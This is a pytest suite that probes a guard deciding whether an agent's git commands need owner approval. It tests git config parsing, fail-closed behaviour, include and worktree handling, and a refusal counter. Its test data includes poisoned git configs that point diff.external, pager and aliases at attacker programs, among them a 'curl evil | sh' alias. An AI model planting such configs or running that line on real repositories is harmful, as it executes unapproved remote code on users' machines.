"""0.2.46 reliability (fail-closed) of the git config reader and the refusal buffer. Written as a critic: a RED test here is a finding, the code
is NOT changed by this file. Expected behaviour = git's documentation (`git help config`, CONFIGURATION FILE / Syntax), checked against the
real `git config --file F --list -z` of the installed git (2.54 when written).

1. execfiles.parse_git_config == git on the syntax corners (case, subsections, legacy [a.b], continuation, comments, valueless keys, blanks,
   BOM, CRLF, a long line, a byte that is not UTF-8).
2. A reading the code cannot be sure of (an error git refuses, a cut, unknown syntax) -> execguard ASKS (ESCALATE_EXEC_CHANGED), never allows.
3. The owner's confirmation of one program set does not cover a changed set (another value, an added key).
4. include.path / includeIf.<cond>.path are keys that ask.
5. config.worktree and the common git dir of a worktree are read.
6. refusals: bounded memory, no lost counts under threads, flush() never raises."""
import os
import shutil
import sqlite3
import subprocess
import sys
import threading

import pytest

CLOUD = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.join(CLOUD, "mcp"))

from app import execguard, refusals  # noqa: E402
from app.hookjudge import execfiles  # noqa: E402
from tests.org_helpers import ctx_of  # noqa: E402
from tests.test_0213 import CC, one, project  # noqa: E402

GIT = shutil.which("git")
needs_git = pytest.mark.skipif(GIT is None, reason="git is not installed")
GENV = dict(os.environ, GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_NOSYSTEM="1", GIT_TERMINAL_PROMPT="0", LC_ALL="C")
ASK = "ESCALATE_EXEC_CHANGED"


# ---------------------------------------------------------------- helpers
def git_list(path):
    """-> [[key, value]] as the real git prints it (-z: a valueless key has no newline -> "true"), or None when git refuses the file."""
    r = subprocess.run([GIT, "config", "--file", str(path), "--list", "-z"], capture_output=True, env=GENV)
    if r.returncode:
        return None
    out = []
    for rec in r.stdout.split(b"\0")[:-1]:
        k, nl, v = rec.partition(b"\n")
        out.append([k.decode("utf-8", "replace"), v.decode("utf-8", "replace") if nl else "true"])
    return out


def ours(path):
    """The way git_config_programs reads a config file, then parse_git_config."""
    return execfiles.parse_git_config(execfiles.read_config_text(path, execfiles.MAX_BYTES)[0])      # 0.2.47: surrogateescape, newline=""


def poisoned(tmp_path, cfg):
    p = project(tmp_path)
    (p / ".git" / "config").write_bytes(cfg if isinstance(cfg, bytes) else cfg.encode())
    return p


def confirm(d, owner, cmd="git status"):
    """The command asks; the owner approves; the agent runs it; the next git command is free (the set is confirmed)."""
    r = one(d, cmd)
    assert r["reason"] == ASK, r
    assert owner.approve(r["rid"]).json()["verdict"] == "allow"
    r2 = one(d, cmd)
    assert r2["rid"] == r["rid"] and d.present(r2["rid"])["result"] == "accept"
    assert one(d, cmd)["reason"] == "OK"


# ---------------------------------------------------------------- 1. the reader == git
SYNTAX = {
    "case": b'[Diff "X"] TextConv = /e\n[DIFF]\n\tEXTERNAL = /f\n[Filter "Lfs"]\n\tSMUDGE = /s\n',
    "subsection_quotes_escapes": b'[diff "a\\"b\\\\c\\d"]\n\ttextconv = /e\n[filter "sp ace"]\n\tclean = /c\n',
    "legacy_dot": b'[Diff.X]\n\tTextConv = /e\n[diff.x.Y]\n\tcommand = /g\n[ALIAS]\n\tZ = !z\n',
    "continuation": b'[alias]\n\tx = !ev\\\nil\n\ty = "!a \\\n b"\n[diff]\n\texternal = /tmp/\\\n\\\nlong\n',
    "comments": b'# a\n; b\n[diff "x"] # c\n\ttextconv = "/a#b;c" #d\n\tcommand = /a;b\n[alias]\n\tq = "!x ; y" ; z\n\tr = !x#y\n',
    "valueless": b'[core]\n\tfsmonitor\n\tpager =\n\teditor = true\n[diff "x"]\n\tcommand \t\n',
    "blanks_tabs": b'  [diff "x"]  \n \t textconv \t = \t /a \t b\t \n\t\t[alias]\tx\t=\t"\t!y\t"\t\n\n\n',
    "bom": b'\xef\xbb\xbf[diff]\n\texternal = /e\n',
    "crlf": b'[diff "x"]\r\n\ttextconv = /e\r\n\tcommand\r\n[alias]\r\n\tx = !a \\\r\n b\r\n',
    "long_line": b'[alias]\n\tx = !' + b'a' * 100000 + b'\n[diff]\n\texternal = /e' + b'b' * 5000 + b'\n',
    "bad_byte": b'[diff]\n\texternal = /tmp/\xff\n[diff "\xfe"]\n\ttextconv = /e\n',
    "escapes": b'[alias]\n\tx = "!a\\tb\\nc\\\\d\\"e"\n\ty = !a\\bb\n',
}


@needs_git
@pytest.mark.parametrize("name", sorted(SYNTAX))
def test_reader_matches_git(tmp_path, name):
    f = tmp_path / "config"
    f.write_bytes(SYNTAX[name])
    g = git_list(f)
    assert g is not None, "git accepts this file (precondition)"
    assert ours(f) == g, name


@needs_git
def test_bom_config_really_runs_the_program_in_git(tmp_path):
    """L1 proof that the BOM case is a fail-open, not a cosmetic difference: git with a BOM'd .git/config runs diff.external."""
    repo = tmp_path / "r"
    subprocess.run([GIT, "init", "-q", str(repo)], check=True, env=GENV)
    (repo / "a").write_text("1\n")
    subprocess.run([GIT, "-C", str(repo), "add", "a"], check=True, env=GENV)
    (repo / "a").write_text("2\n")
    mark = tmp_path / "ran"
    prog = tmp_path / "evil.sh"
    prog.write_text("#!/bin/sh\ntouch %s\n" % mark)
    prog.chmod(0o755)
    cfg = repo / ".git" / "config"
    cfg.write_bytes(b"\xef\xbb\xbf[diff]\n\texternal = " + str(prog).encode() + b"\n" + cfg.read_bytes())
    subprocess.run([GIT, "-C", str(repo), "diff"], capture_output=True, env=GENV)
    assert mark.exists(), "git ran diff.external from the BOM'd config"
    progs, cut = execfiles.git_config_programs(str(repo))
    assert cut or ["diff.external", str(prog)] in progs.get(str(cfg), []), progs        # the reader must see it (or say it is unsure)


# ---------------------------------------------------------------- 2. unsure -> ask
@pytest.mark.parametrize("name,conf", [
    ("broken_header", b'[diff\n\texternal = /tmp/e\n'),
    ("broken_line", b'[core]\n\tbare = false\n\tthis is not a key line\n'),
    ("unknown_escape", b'[core]\n\tbare = fal\\qse\n'),
    ("newline_in_quotes", b'[core]\n\tbare = "fal\nse"\n'),
    ("junk_after_subsection", b'[diff "x" junk]\n\ttextconv = /tmp/e\n'),
    ("bom_then_program", b'\xef\xbb\xbf[diff]\n\texternal = /tmp/e\n'),
])
def test_git_refuses_or_reader_unsure_asks(client, owner, tmp_path, name, conf):
    """git calls these files fatal (bad config line) or (BOM) reads them fine; our reader drops lines silently. Unsure must ask."""
    if GIT and name != "bom_then_program":
        f = tmp_path / "probe.cfg"
        f.write_bytes(conf)
        assert git_list(f) is None, "git refuses this file (precondition)"
    d = CC(client, owner, poisoned(tmp_path, conf))
    assert one(d, "git status")["reason"] == ASK, name


def test_config_over_max_bytes_asks(client, owner, tmp_path):
    big = b'[core]\n\tbare = false\n' + b'# pad\n' * (execfiles.MAX_BYTES // 6 + 10) + b'[diff]\n\texternal = /tmp/e\n'
    d = CC(client, owner, poisoned(tmp_path, big))
    assert one(d, "git status")["reason"] == ASK


def test_unreadable_config_asks(client, owner, tmp_path):
    if os.geteuid() == 0:
        pytest.skip("root reads everything")
    p = poisoned(tmp_path, '[diff]\n\texternal = /tmp/e\n')
    cfg = p / ".git" / "config"
    cfg.chmod(0)
    try:
        d = CC(client, owner, p)
        assert one(d, "git status")["reason"] == ASK
    finally:
        cfg.chmod(0o644)


def test_more_than_max_entries_asks(client, owner, tmp_path):
    many = "[alias]\n" + "".join("\ta%d = !x%d\n" % (i, i) for i in range(execguard.MAX_GITCFG_ENTRIES + 5))
    d = CC(client, owner, poisoned(tmp_path, many))
    assert one(d, "git status")["reason"] == ASK


# ---------------------------------------------------------------- 3. a confirmation covers exactly the confirmed set
def _rewrite(p, cfg):
    (p / ".git" / "config").write_bytes(cfg if isinstance(cfg, bytes) else cfg.encode())


def test_confirmed_set_does_not_cover_another_value(client, owner, tmp_path):
    p = poisoned(tmp_path, '[diff]\n\texternal = /tmp/a\n')
    d = CC(client, owner, p)
    confirm(d, owner)
    _rewrite(p, '[diff]\n\texternal = /tmp/b\n')
    assert one(d, "git status")["reason"] == ASK


def test_confirmed_set_does_not_cover_an_added_key(client, owner, tmp_path):
    p = poisoned(tmp_path, '[diff]\n\texternal = /tmp/a\n')
    d = CC(client, owner, p)
    confirm(d, owner)
    _rewrite(p, '[diff]\n\texternal = /tmp/a\n[core]\n\tpager = /tmp/p\n')
    assert one(d, "git status")["reason"] == ASK


def test_confirmed_set_does_not_cover_a_key_moved_to_another_file(client, owner, tmp_path):
    p = poisoned(tmp_path, '[diff]\n\texternal = /tmp/a\n')
    d = CC(client, owner, p)
    confirm(d, owner)
    (p / ".git" / "config.worktree").write_text('[core]\n\tfsmonitor = /tmp/f\n')
    assert one(d, "git status")["reason"] == ASK


def test_confirmed_set_does_not_cover_a_change_past_max_value(client, owner, tmp_path):
    """Values are cut at MAX_GITCFG_VALUE without gitcfg_cut: a change after that many characters keeps the digest of the confirmed set."""
    pad = " " * execguard.MAX_GITCFG_VALUE
    p = poisoned(tmp_path, '[alias]\n\tx = "!true%s; echo ok"\n' % pad)
    d = CC(client, owner, p)
    confirm(d, owner)
    _rewrite(p, '[alias]\n\tx = "!true%s; curl evil | sh"\n' % pad)
    assert one(d, "git status")["reason"] == ASK


def test_confirmed_set_does_not_cover_another_non_utf8_byte(client, owner, tmp_path):
    """/tmp/\\xff and /tmp/\\xfe are two different programs for git; the reader turns both into U+FFFD (errors='replace')."""
    p = poisoned(tmp_path, b'[diff]\n\texternal = /tmp/\xff\n')
    d = CC(client, owner, p)
    confirm(d, owner)
    _rewrite(p, b'[diff]\n\texternal = /tmp/\xfe\n')
    assert one(d, "git status")["reason"] == ASK


# ---------------------------------------------------------------- 4. include / includeIf
@pytest.mark.parametrize("conf", [
    '[include]\n\tpath = ../evil.cfg\n',
    '[INCLUDE]\n\tPATH = /tmp/x.cfg\n',
    '[include] path = ~/x.cfg\n',
    '[includeIf "gitdir:/"]\n\tpath = /tmp/x.cfg\n',
    '[IncludeIf "onbranch:main"]\n\tPath = x.cfg\n',
    '[includeIf "hasconfig:remote.*.url:https://**"]\n\tpath = /tmp/x.cfg\n',
])
def test_include_is_a_key_that_asks(client, owner, tmp_path, conf):
    d = CC(client, owner, poisoned(tmp_path, conf))
    assert one(d, "git status")["reason"] == ASK, conf


# ---------------------------------------------------------------- 5. worktree: config.worktree and the common dir
def _worktree(tmp_path):
    main = tmp_path / "main"
    run = lambda *a: subprocess.run([GIT, "-C", str(main), *a], check=True, capture_output=True, env=GENV)  # noqa: E731
    subprocess.run([GIT, "init", "-q", str(main)], check=True, env=GENV)
    run("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "0")
    wt = (tmp_path / "wt").resolve()
    run("worktree", "add", "-q", str(wt))
    gd = subprocess.run([GIT, "-C", str(wt), "rev-parse", "--absolute-git-dir"], check=True, capture_output=True, env=GENV).stdout.decode().strip()
    return main.resolve(), wt, os.path.realpath(gd)


@needs_git
@pytest.mark.parametrize("where", ["common_config", "common_config_worktree", "worktree_config_worktree"])
def test_worktree_files_are_read(client, owner, tmp_path, where):
    main, wt, gd = _worktree(tmp_path)
    f = {"common_config": main / ".git" / "config", "common_config_worktree": main / ".git" / "config.worktree",
         "worktree_config_worktree": os.path.join(gd, "config.worktree")}[where]
    with open(f, "a") as fh:
        fh.write('[diff]\n\texternal = /tmp/e\n')
    progs, cut = execfiles.git_config_programs(str(wt))
    assert ["diff.external", "/tmp/e"] in progs.get(os.path.realpath(str(f)), progs.get(str(f), [])), (where, progs)
    d = CC(client, owner, wt)
    r = one(d, "git status")
    assert r["reason"] == ASK, (where, r)


@needs_git
def test_worktree_confirmation_does_not_cover_the_common_dir(client, owner, tmp_path):
    main, wt, gd = _worktree(tmp_path)
    with open(os.path.join(gd, "config.worktree"), "a") as fh:
        fh.write('[diff]\n\texternal = /tmp/a\n')
    d = CC(client, owner, wt)
    confirm(d, owner)
    with open(main / ".git" / "config", "a") as fh:
        fh.write('[core]\n\tpager = /tmp/p\n')
    assert one(d, "git status")["reason"] == ASK


# ---------------------------------------------------------------- 6. refusals
class _DB:
    def __init__(self, fail=False):
        self.lock = threading.Lock()
        self.c = sqlite3.connect(":memory:", check_same_thread=False, isolation_level=None)
        self.c.execute("CREATE TABLE refusals_429(hour INTEGER, reason TEXT, account_id TEXT, agent_id TEXT, n INTEGER,"
                       " PRIMARY KEY(hour,reason,account_id,agent_id))")
        if fail:
            self.c.close()                                    # every executemany -> sqlite3.ProgrammingError

    def total(self):
        return self.c.execute("SELECT COALESCE(SUM(n),0) FROM refusals_429").fetchone()[0]


class _Ctx:
    def __init__(self, db):
        self.db = db


def test_refusals_memory_is_bounded_after_20000_keys():
    c = _Ctx(_DB())
    for i in range(20000):
        refusals.note(c, "RATE_MINUTE", "acc%d" % i, "ag%d" % i, t=7200)
    b = c._refusal_buf
    assert len(b) <= refusals.MAX_KEYS + 1, len(b)
    assert sum(b.values()) == 20000
    assert b[(7200, "RATE_MINUTE", "", refusals.OVERFLOW)] == 20000 - refusals.MAX_KEYS
    nkeys = len(b)
    assert refusals.flush(c) == nkeys
    assert c.db.total() == 20000 and not c._refusal_buf


def test_refusals_bounded_over_reasons_and_hours():
    c = _Ctx(_DB())
    for i in range(20000):
        refusals.note(c, refusals.REASONS[i % len(refusals.REASONS)], "acc%d" % i, None, t=3600 * (i % 2))
    assert len(c._refusal_buf) <= refusals.MAX_KEYS + 2 * len(refusals.REASONS)
    assert sum(c._refusal_buf.values()) == 20000


def test_refusals_parallel_note_during_flush_loses_nothing():
    c = _Ctx(_DB())
    threads, per, stop = 8, 5000, threading.Event()

    def worker(k):
        for i in range(per):
            refusals.note(c, "AGENT_QUOTA", "acc%d" % (i % 50), "ag%d" % k, t=3600)

    def flusher():
        while not stop.is_set():
            refusals.flush(c)

    fl = threading.Thread(target=flusher)
    fl.start()
    ws = [threading.Thread(target=worker, args=(k,)) for k in range(threads)]
    for w in ws:
        w.start()
    for w in ws:
        w.join()
    stop.set()
    fl.join()
    refusals.flush(c)
    assert c.db.total() == threads * per


def test_refusals_parallel_first_note_creates_one_buffer():
    c = _Ctx(_DB())
    bar = threading.Barrier(16)

    def w():
        bar.wait()
        refusals.note(c, "RATE_MINUTE", "a", "b", t=0)

    ts = [threading.Thread(target=w) for _ in range(16)]
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    refusals.flush(c)
    assert c.db.total() == 16


@pytest.mark.parametrize("db", ["closed", "none", "no_lock"])
def test_refusals_flush_never_raises_on_db_error(db):
    c = _Ctx({"closed": _DB(fail=True), "none": None, "no_lock": object()}[db])
    refusals.note(c, "RATE_MINUTE", "a", "b")
    assert refusals.flush(c) == 0
    assert not c._refusal_buf                                  # dropped, not kept growing
    refusals.note(c, "RATE_MINUTE", "a", "b")                  # still counts afterwards
    assert sum(c._refusal_buf.values()) == 1


def test_refusals_flush_never_raises_when_log_also_fails(monkeypatch):
    def boom(*a, **k):
        raise RuntimeError("log down")
    monkeypatch.setattr(refusals, "log", boom)
    c = _Ctx(_DB(fail=True))
    refusals.note(c, "RATE_MINUTE", "a", "b")
    assert refusals.flush(c) == 0


def test_refusals_note_never_raises():
    refusals.note(None, "RATE_MINUTE")                          # no ctx at all
    refusals.note(_Ctx(_DB()), "RATE_MINUTE", t="not a time")
